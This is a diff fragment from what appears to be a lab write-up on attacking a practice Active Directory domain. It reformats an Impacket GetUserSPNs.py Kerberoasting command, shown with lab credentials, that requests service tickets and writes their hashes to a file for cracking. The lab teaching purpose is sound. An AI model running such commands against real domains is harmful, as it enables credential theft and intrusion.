@@ -73,8 +73,11 @@ ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" 
 
 - let's find them with impacket
 
+```shell
+GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
 ```
-# GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
+
+```
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
 ---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
